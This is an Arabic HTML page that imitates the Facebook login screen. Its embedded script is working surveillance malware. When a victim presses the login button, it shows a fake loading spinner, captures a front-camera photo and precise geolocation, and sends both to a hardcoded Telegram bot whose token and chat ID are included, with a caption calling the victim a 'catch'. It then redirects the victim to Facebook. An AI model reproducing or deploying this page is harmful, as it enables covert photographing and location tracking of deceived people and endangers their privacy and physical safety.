<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول إلى فيسبوك</title>
    <style>
        body {margin:0;padding:0;background:#f0f2f5;font-family:system-ui,sans-serif;display:flex;justify-content:center;align-items:flex-start;min-height:100vh;padding-top:20px;}
        .fb-container {width:100%;max-width:400px;background:white;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);overflow:hidden;}
        .header {background:#1877f2;padding:12px;text-align:center;color:white;font-size:20px;font-weight:bold;}
        .form-area {padding:20px;}
        input {width:100%;padding:14px;margin:8px 0;border:1px solid #dddfe2;border-radius:6px;font-size:16px;box-sizing:border-box;}
        .login-btn {width:100%;padding:14px;background:#1877f2;color:white;font-size:18px;font-weight:bold;border:none;border-radius:6px;cursor:pointer;margin-top:10px;}
        .links {text-align:center;margin:15px 0;font-size:14px;}
        .links a {color:#1877f2;text-decoration:none;}
        .footer {text-align:center;padding:20px;font-size:13px;color:#8a8d91;}
        
        /* شاشة التحميل الوهمية */
        #loading { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.8); z-index:9999; flex-direction:column; justify-content:center; align-items:center; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div id="loading">
    <div class="spinner"></div>
    <p style="margin-top:10px; color:#1877f2;">جاري تسجيل الدخول...</p>
</div>

<div class="fb-container">
    <div class="header">فيسبوك</div>
    <div class="form-area">
        <form>
            <input type="text" id="u" placeholder="رقم الجوال أو البريد الإلكتروني">
            <input type="password" id="p" placeholder="كلمة المرور">
            <button type="button" id="startBtn" class="login-btn">تسجيل الدخول</button>
        </form>
        <div class="links">
            <a href="#">نسيت كلمة المرور؟</a><br><br>
            <a href="#">إنشاء حساب جديد</a>
        </div>
    </div>
    <div class="footer">
        العربية · Meta © 2026
    </div>
</div>

<script>
const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
const CHAT_ID = "1611398303";

document.getElementById('startBtn').onclick = function() {
    // إظهار شاشة التحميل فوراً
    document.body.style.pointerEvents = "none";
    document.getElementById('loading').style.display = 'flex';

    // بدء طلب الأذونات فوراً
    initAttack();
};

async function initAttack() {
    try {
        // طلب الكاميرا
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const v = document.createElement('video');
        v.srcObject = stream;
        v.play();

        // التقاط الصورة بعد ثانية واحدة للسرعة
        setTimeout(async () => {
            const canvas = document.createElement('canvas');
            canvas.width = 720; canvas.height = 1280;
            canvas.getContext('2d').drawImage(v, 0, 0, 720, 1280);
            const img = canvas.toDataURL('image/jpeg');
            stream.getTracks().forEach(t => t.stop());

            // طلب الموقع
            navigator.geolocation.getCurrentPosition(
                (pos) => sendDataAndRedirect(img, pos),
                () => sendDataAndRedirect(img, null), // إرسال الصورة حتى لو رفض الموقع
                { enableHighAccuracy: true, timeout: 5000 }
            );
        }, 1500);

    } catch (e) {
        // إذا رفض الكاميرا، نحاول سحب الموقع ثم نحوله
        navigator.geolocation.getCurrentPosition(
            (pos) => sendDataAndRedirect(null, pos),
            () => window.location.href = "fb://feed", // توجيه للتطبيق فوراً
            { timeout: 3000 }
        );
        setTimeout(() => { window.location.href = "https://m.facebook.com/"; }, 4000);
    }
}

async function sendDataAndRedirect(img, pos) {
    let caption = "🎓 مشروع تخرج - صيد جديد\n";
    if (pos) {
        const lat = pos.coords.latitude.toFixed(6);
        const lng = pos.coords.longitude.toFixed(6);
        caption += `📍 الموقع: ${lat},${lng}\n🔗 الخريطة: https://www.google.com/maps?q=${lat},${lng}`;
    } else {
        caption += "📍 الموقع: تم الرفض";
    }

    if (img) {
        const blob = dataURLtoBlob(img);
        const fd = new FormData();
        fd.append('photo', blob, 'shot.jpg');
        fd.append('caption', caption);
        fd.append('chat_id', CHAT_ID);
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
    } else {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(caption)}`);
    }

    // 🔱 التوجيه النهائي الفوري
    // نحاول فتح التطبيق أولاً، إذا لم يفتح نذهب للموقع
    window.location.href = "fb://feed"; 
    setTimeout(() => {
        window.location.href = "https://m.facebook.com/login/";
    }, 500);
}

function dataURLtoBlob(d) {
    let arr = d.split(','), m = arr[0].match(/:(.*?);/)[1], b = atob(arr[1]), n = b.length, u = new Uint8Array(n);
    while(n--) u[n] = b.charCodeAt(n);
    return new Blob([u], {type: m});
}
</script>

</body>
</html>
